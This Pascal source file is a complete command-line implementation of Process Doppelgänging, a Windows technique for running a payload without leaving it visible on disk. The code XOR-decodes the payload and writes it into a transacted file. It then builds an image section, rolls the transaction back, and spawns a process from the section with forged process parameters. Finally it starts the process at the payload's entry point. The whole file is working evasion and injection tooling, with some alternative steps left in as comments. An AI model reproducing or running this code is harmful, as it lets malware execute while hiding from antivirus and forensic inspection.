//this is https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging
//or https://github.com/hasherezade/process_doppelganging
//or https://gist.github.com/hfiref0x/a9911a0b70b473281c9da5daea9a177f
//also see https://github.com/jxy-s/herpaderping

program NtCreateThread;

uses windows,sysutils, ntdll ;

var
dummy:dword;



   function CreateFileTransactedW(
                    lpFileName:LPCWSTR;
                      dwDesiredAccess:DWORD;
                      dwShareMode:DWORD;
      lpSecurityAttributes:LPSECURITY_ATTRIBUTES;
                      dwCreationDisposition:DWORD;
                      dwFlagsAndAttributes:DWORD;
                     hTemplateFile:THANDLE;
                     hTransaction:THANDLE;
                    pusMiniVersion:PUSHORT;
                      lpExtendedParameter:PVOID
   ): THANDLE; stdcall; stdcall; external 'kernel32.dll';

   function GetProcessId(Process: THandle): DWORD; stdcall; external 'kernel32.dll' name 'GetProcessId';
   function GetThreadId(Process: THandle): DWORD; stdcall; external 'kernel32.dll' name 'GetThreadId';

   function CreateEnvironmentBlock(
             lpEnvironment:ppvoid;
    hToken:HANDLE;
              bInherit:BOOL):BOOL; stdcall; external 'userenv.dll' ;

   //function ImageNtHeader(Base: Pointer): PIMAGE_NT_HEADERS; stdcall; external 'dbghelp.dll';

   procedure log(msg:string);
   begin
   writeln(msg);
   end;

   procedure InitializeObjectAttributes(var p: TObjectAttributes; n:PUNICODE_STRING;
                                             a: ULONG; r: THandle; s: PVOID);
   begin
     p.Length := SizeOf(OBJECT_ATTRIBUTES);
     p.RootDirectory := r;
     p.Attributes := a;
     p.ObjectName := n;
     p.SecurityDescriptor := s;
     p.SecurityQualityOfService := nil;
   end;

   function xorfileV3(filein:string;var bufferOut:pointer):dword;
   var
     dwread:dword=0;
     c:dword;
     dwFileSize:dword;
     hfilein:thandle;
     pOut:^byte;
     key:array[0..2] of word=($400,$1000,$4000);
     label fin;
   begin
     //log('********* xorfile **************');
     hFilein := CreateFile(pchar(filein),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
     if hFilein=thandle(-1) then exit;
     //
     dwFileSize := GetFileSize(hFilein,nil);
     log('dwFileSize:'+inttostr(dwFileSize));
     if dwFileSize = INVALID_FILE_SIZE then exit;

     bufferOut := AllocMem(dwFileSize);

     ReadFile(hFilein,bufferOut^,dwFileSize,dwRead,nil);
     if (dwread=0) or (dwread<>dwFileSize) then goto fin;
     //xor buffer here
     pOut:=bufferOut;
     for c:=0 to dwread -1 do
       begin
       pOut^ := pOut^ xor (Key[2] shr 8);
       Key[2] := byte(pOut^ + Key[2]) * Key[0] + Key[1];
       inc(pOut);
       end;
     //
     result:=dwFileSize ;

     //
     fin:
     closehandle(hFilein);
     log('XOR OK');
   end;

   function xorfile(filein:string;var buffer:pointer):dword;
var
  dwread:dword=0;
  dwwrite:dword=0;
  c:dword;
  dwFileSize:dword;
  hfilein,hfileout:thandle;
  //buffer:pointer;
  ptr:pbyte;
  label fin;
begin
  //log('********* xorfile **************');
  hFilein := CreateFile(pchar(filein),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  if hFilein=thandle(-1) then exit;
  //
  dwFileSize := GetFileSize(hFilein,nil);
  log('dwFileSize:'+inttostr(dwFileSize));
  if dwFileSize = INVALID_FILE_SIZE then exit;

  buffer := AllocMem(dwFileSize);

  ReadFile(hFilein,buffer^,dwFileSize,dwRead,nil);
  if (dwread=0) or (dwread<>dwFileSize) then goto fin;
  //xor buffer here
  ptr:=buffer;
  for c:=0 to dwread -1 do
    begin
    ptr^:=ptr^ xor 255;
    inc(ptr);
    end;
  //
  result:=dwFileSize ;

  //
  fin:
  closehandle(hFilein);
  log('XOR OK');
end;

   procedure main(targetapp,payload:widestring;late_rollback:boolean=false);
   var
      targetHandle :thandle=thandle(-1);
   hprocess :thandle=thandle(-1);
   SectionHandle:thandle=thandle(-1);
   hTransaction:thandle=thandle(-1);
   hTransactedFile:thandle=thandle(-1);
   Attrib:OBJECT_ATTRIBUTES;
   ClientId:CLIENT_ID;
   ScectionDataSize:TLargeInteger; //size of the payload
    localSectionAddress :pvoid= nil;
     localSectionOffset :LARGE_INTEGER;
     remoteSectionAddress:pvoid = nil;
     RemoteThread :thandle=0;
     outFile:thandle=thandle(-1);
     buffer:pointer=nil;
     temp:array [0..$1000-1] of byte;
     bytesread:dword=0;
     byteswritten:dword=0;
     status:NTSTATUS;
     pbi:PROCESS_BASIC_INFORMATION;
     ReturnLength,numberofbytesread:ulong;
     EntryPoint:nativeuint;
     ntheaders:PIMAGE_NT_HEADERS;
     ImageBaseAddress:nativeuint;
     ustr,udir:UNICODE_STRING ;
     ProcessParameters:PRTL_USER_PROCESS_PARAMETERS=nil;
     MemoryPtr:pvoid=nil;
     peb_:PPEB;
     n:NativeUInt ;
     environment:pvoid;
   begin
     {
     //test local peb
     status := NtQueryInformationProcess(GetCurrentProcess ,ProcessBasicInformation,@pbi,sizeof(PROCESS_BASIC_INFORMATION),@ReturnLength);
     writeln('NtQueryInformationProcess:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;
     writeln('PebBaseAddress:'+inttohex(nativeuint(pbi.PebBaseAddress),sizeof(pointer)));
     writeln('UniqueProcessId:'+inttostr(pbi.UniqueProcessId));

     numberofbytesread:=0;
     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$10), @ImageBaseAddress, sizeof(pvoid), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
     writeln('ImageBaseAddress:'+inttohex(ImageBaseAddress,sizeof(ImageBaseAddress)));

     numberofbytesread:=0;
     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
     writeln('ProcessParameters:'+inttohex(n,sizeof(n)));

     //lets read the whole PEB
     numberofbytesread:=0;
     getmem(peb_,sizeof(PEB));
     status:=NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, peb_, sizeof(PEB), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));

     writeln('ImageBaseAddress:'+inttohex(nativeuint(peb_^.ImageBaseAddress),sizeof(n) ) );
     writeln('ProcessParameters:'+inttohex(nativeuint(peb_^.ProcessParameters),sizeof(pointer)));
     writeln(strpas(peb_^.ProcessParameters^.CommandLine.Buffer ) );

     //lets overwrite processparameters address
     status:=NtWriteVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
     writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));

     numberofbytesread:=0;
     status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
     writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
     writeln('ProcessParameters:'+inttohex(n,sizeof(n)));


     //
     exit;
     }
     //***************** lets read the payload
     writeln('****************');
     if (lowercase(ExtractFileExt (payload))<>'.xor') and (lowercase(ExtractFileExt (payload))<>'.encrypted') then
     begin
     outFile := CreateFilew(pwidechar(payload), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
     if outFile=thandle(-1) then exit;
     bytesread:=GetFileSize(outfile,nil) ;
     writeln('bytesread='+inttostr(bytesread));
     if bytesread =0 then exit;
     getmem(buffer,bytesread );
     if readfile(outfile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
     writeln('bytesread='+inttostr(bytesread));
     CloseHandle(outfile);
     ScectionDataSize  :=bytesread;
     end
     else
     ScectionDataSize:=xorfilev3(payload,buffer);


     {
     //if we want to hijack another process
     InitializeObjectAttributes(Attrib ,nil,0,0,nil);
     fillchar(clientid,sizeof(clientid),0);
     clientid.UniqueProcess :=88748;
     status:=NtOpenProcess(@targetHandle, {$1F0FFF}PROCESS_ALL_ACCESS, @Attrib, @clientid );
     writeln('NtOpenProcess:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;
     }


     //************** lets create a transacted file
     writeln('****************');
     InitializeObjectAttributes(Attrib ,nil,0,0,nil);
     status := NtCreateTransaction(@hTransaction,TRANSACTION_ALL_ACCESS,@Attrib,nil,0,0,0,0,nil,nil);
     writeln('NtCreateTransaction:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;


     writeln('targetapp:'+(targetapp));
     //we could use DWORD size = GetTempPathW(MAX_PATH, temp_path);  GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
     //create_always if you want to use a non existing file
     if FileExists(targetapp)
        then hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil)
        else hTransactedFile:=CreateFileTransactedw(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,CREATE_ALWAYS ,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil);
     if hTransactedFile =thandle(-1) then
                 begin
                 writeln('hTransactedFile=invalid handle,'+inttostr(getlasterror));
                 exit;
                 end;

     if WriteFile(hTransactedFile, Buffer^, ScectionDataSize, byteswritten, nil) =false then
                 begin
                 writeln('WriteFile failed');
                 exit;
                 end
                 else writeln('byteswritten:'+inttostr(byteswritten));


     //************* lets create a section against this transacted file
     writeln('****************');
     //in a normal life we would pass the handle to the file rather than hTransactedFile
     status:=NtCreateSection(@SectionHandle,SECTION_ALL_ACCESS,nil,nil,PAGE_READONLY,SEC_IMAGE,hTransactedFile);
     //status:=NtCreateSection(@SectionHandle, $E, nil, @ScectionDataSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nil );
     writeln('NtCreateSection:'+inttohex(status,sizeof(status)));
     if SectionHandle <=0 then exit;
     if status<>0 then exit;

     //rolling back here will make it so that ProcessImageFileName will be messed up
     if late_rollback=false then
     begin
     status := NtRollbackTransaction(hTransaction, TRUE);
     writeln('NtRollbackTransaction:'+inttohex(status,sizeof(status)));

     CloseHandle(hTransactedFile);
     hTransactedFile := INVALID_HANDLE_VALUE;

     NtClose(hTransaction);
     hTransaction := 0;
     end;

     {
     localSectionOffset.QuadPart :=0;
     //kind of NtWriteVirtualMemory
     status:=NtMapViewOfSection( SectionHandle, thandle(-1), @localSectionAddress, 0, 0, @localSectionOffset, @ScectionDataSize , $2, $0, $4 );
     writeln('NtMapViewOfSection:'+inttohex(status,sizeof(status)));
     writeln('localSectionAddress:'+inttohex(nativeuint(localSectionAddress),sizeof(localSectionAddress)));
     if localSectionAddress=nil then exit;

     status:=NtMapViewOfSection( SectionHandle, targetHandle, @remoteSectionAddress, 0, 0, @localSectionOffset, @ScectionDataSize , $2, $0, $20 );
     writeln('NtMapViewOfSection:'+inttohex(status,sizeof(status)));
     writeln('remoteSectionAddress:'+inttohex(nativeuint(remoteSectionAddress),sizeof(remoteSectionAddress)));
     if localSectionAddress=nil then exit;

     CopyMemory (localSectionAddress ,buffer,ScectionDataSize  );
     }

     {
     //readln;
     //remoteSectionAddress OK but what about entrypoint
     status:=NtCreateThreadEx(@RemoteThread, $1FFFFF{THREAD_ALL_ACCESS}, nil, targetHandle, remoteSectionAddress, nil, false, 0, nil, nil, nil );
     writeln('NtCreateThreadEx:'+inttohex(status,sizeof(status)));
     //remoteSectionAddress:E6FFC20000
     //Exception non gérée à 0x000000E6FFC20004 dans cmd.exe : 0xC0000005 :
     //Violation d'accès lors de l'écriture à l'emplacement 0x0000001CDFF84000.
     }

     //************** lets create the process from the section
     writeln('****************');
             ZeroMemory(@hprocess,sizeof(hprocess));
             //
             {
             InitializeObjectAttributes(Attrib ,nil,0,0,nil);
             RtlInitUnicodeString(@ustr , pwstr(targetapp ));
             attrib.ObjectName :=@ustr;
             attrib.Attributes := $00000002; //OBJ_INHERIT  00000040
             }
             //
             status := NtCreateProcessEx(@hProcess,
                 PROCESS_ALL_ACCESS,
                 nil, //@attrib
                 ntCurrentProcess,
                 PS_INHERIT_HANDLES,
                 SectionHandle,
                 0,
                 0,
                 FALSE);

             writeln('NtCreateProcessEx:'+inttohex(status,sizeof(status)));
             if status<>0 then exit;
             writeln('pid:'+inttostr(GetProcessID(hProcess)));

     //
     if late_rollback=true then
     begin
     status := NtRollbackTransaction(hTransaction, TRUE);
     writeln('NtRollbackTransaction:'+inttohex(status,sizeof(status)));

     CloseHandle(hTransactedFile);
     hTransactedFile := INVALID_HANDLE_VALUE;

     NtClose(hTransaction);
     hTransaction := 0;
     end;
     //
     //        https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
     //        0xC0000024 STATUS_OBJECT_TYPE_MISMATCH
     //C0000049	STATUS_SECTION_NOT_IMAGE
     //C0000020	STATUS_INVALID_FILE_FOR_SECTION

     // **************** lets get the entry point
     writeln('****************');
     fillchar(pbi,sizeof(pbi),0);
     status := NtQueryInformationProcess(hProcess,ProcessBasicInformation,@pbi,sizeof(PROCESS_BASIC_INFORMATION),@ReturnLength);
     writeln('NtQueryInformationProcess:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;
     writeln('PebBaseAddress:'+inttohex(nativeuint(pbi.PebBaseAddress),sizeof(pointer)));
     writeln('UniqueProcessId:'+inttostr(pbi.UniqueProcessId)) ;

      //getmem(buffer,$1000);
      fillchar(temp,sizeof(temp),0);
      //status:=NtReadVirtualMemory(hProcess, (pbi.PebBaseAddress), @temp[0], $1000, @numberofbytesread );
      //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm
      status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$10), @ImageBaseAddress, sizeof(pvoid), @numberofbytesread );
      //if ReadProcessMemory (hprocess,pbi.PebBaseAddress ,@temp[0],$1000,@numberofbytesread )=true then status:=0;
      writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('ImageBaseAddress:'+inttohex(ImageBaseAddress,sizeof(ImageBaseAddress)));
      //writeln('numberofbytesread:'+inttostr(numberofbytesread));
      if status<>0 then exit;

      ntheaders:=RtlImageNtHeader(Buffer);

      //writeln(inttohex(nativeuint(ntheaders),sizeof(pointer))) ;
      EntryPoint := ntheaders^.OptionalHeader.AddressOfEntryPoint;
      writeln('EntryPoint:'+inttohex(EntryPoint,sizeof(EntryPoint)));
      EntryPoint := EntryPoint + ImageBaseAddress;
      writeln('EntryPoint:'+inttohex(EntryPoint,sizeof(EntryPoint)));

      //*********** Allocate memory in target process and write process parameters block.
      //CreateEnvironmentBlock(@environment, 0, TRUE);
      writeln('****************');
      RtlInitUnicodeString(@ustr, pwstr(targetapp )); //whatever you want here
      RtlInitUnicodeString(@udir, pwstr('c:\windows\system32' )); //whatever you want here
      writeln('targetapp:'+strpas(ustr.Buffer) );
      //zeromemory(ProcessParameters,sizeof(ProcessParameters));
        status := RtlCreateProcessParametersEx(@ProcessParameters,
            @ustr, //image path name
            @udir,
            @udir,
            @ustr, //command line
            nil, //environment
            nil,
            nil,
            nil,
            nil,
            {0} RTL_USER_PROC_PARAMS_NORMALIZED); //offset vs pointers
      writeln('RtlCreateProcessParametersEx:'+inttohex(status,sizeof(status)));
      writeln('ProcessParameters:'+inttohex(nativeuint(ProcessParameters),sizeof(nativeuint)));
      try
        writeln('CommandLine:'+strpas(ProcessParameters^.CommandLine.Buffer  ))  ;
        writeln('ImagePathName:'+strpas(ProcessParameters^.ImagePathName.Buffer  ))  ;
      except
      end;

      writeln('****************');

      numberofbytesread := ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength;
      numberofbytesread:=align(numberofbytesread,$1000);
      writeln('numberofbytesread:'+inttostr(numberofbytesread));

      MemoryPtr := ProcessParameters;
      writeln('MemoryPtr:'+inttohex(nativeuint(MemoryPtr),sizeof(nativeuint)));

      status := NtAllocateVirtualMemory(hProcess,@MemoryPtr,0,@numberofbytesread,MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE);
      writeln('NtAllocateVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('ProcessParameters:'+inttohex(nativeuint(ProcessParameters),sizeof(nativeuint)));
      numberofbytesread := 0;
      status := NtWriteVirtualMemory(hProcess,ProcessParameters,ProcessParameters,ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,@numberofbytesread );
      //or
      //status := NtWriteVirtualMemory(hProcess,MemoryPtr,ProcessParameters,ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,@numberofbytesread );
      writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('numberofbytesread:'+inttostr(numberofbytesread));
      //0x8000000D   STATUS_PARTIAL_COPY


      //************Update PEB->ProcessParameters pointer to newly allocated block.

      //Peb_ := pbi.PebBaseAddress;
      //writeln('Peb:'+inttohex(nativeuint(Peb),sizeof(pointer)));
      n:=nativeuint(ProcessParameters );
      //n:=nativeuint(addr(MemoryPtr));
      //writeln('MemoryPtr:'+inttohex(nativeuint(addr(MemoryPtr)),sizeof(n)));
      numberofbytesread := 0;
      //status:=NtWriteVirtualMemory(hProcess,pointer(nativeuint(pbi.PebBaseAddress)+$20),ProcessParameters,sizeof(PVOID),@numberofbytesread);
      //or
      status:=NtWriteVirtualMemory(hProcess,pointer(nativeuint(pbi.PebBaseAddress)+$20),@n,sizeof(PVOID),@numberofbytesread);
      writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('numberofbytesread:'+inttostr(numberofbytesread));
      //check memory
      //status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
      //writeln('n:'+inttohex(nativeuint(n ),sizeof(n)));
      //
      //
      //status:= NtSetInformationProcess(hprocess,ProcessImageFileName,@ustr,sizeof(ustr));
      //writeln('NtSetInformationProcess:'+inttohex(status,sizeof(status)));
      //fails with 0xC0000003, STATUS_INVALID_INFO_CLASS
      RtlInitUnicodeString(@ustr, pwstr(targetapp ));
      status:=NtqueryInformationProcess(hprocess ,ProcessImageFileName ,@ustr,sizeof(ustr),@ReturnLength);
      writeln('NtqueryInformationProcess:'+inttohex(status,sizeof(status))+' '+inttostr(ReturnLength));
      writeln('ProcessImageFileName:'+strpas(ustr.Buffer) ); //will be empty :(
      status:=RtlDestroyProcessParameters(ProcessParameters);
      writeln('RtlDestroyProcessParameters:'+inttohex(status,sizeof(status)));
      //readln;
      writeln('****************');
      RemoteThread := 0;
        status := NtCreateThreadEx(@RemoteThread,
            THREAD_ALL_ACCESS,
            nil,
            hProcess,
            pointer(EntryPoint),
            nil,
            FALSE,
            0,
            nil,
            nil,
            nil);
        writeln('NtCreateThreadEx:'+inttohex(status,sizeof(status)));
        writeln('RemoteThread:'+inttostr(GetThreadId(RemoteThread)));
      //

     //NtClose( targetHandle );
     NtClose( SectionHandle );
     //NtClose( remoteSectionAddress );
     //NtClose( localSectionAddress );
     //NtClose( RemoteThread );
     //readln;
   end;

begin
  writeln('Process-Doppelganging');
  writeln('ntcreatethreadex.exe targetapp payload');
  if paramcount<>2 then exit;
  main(paramstr(1),paramstr(2),false);

end.

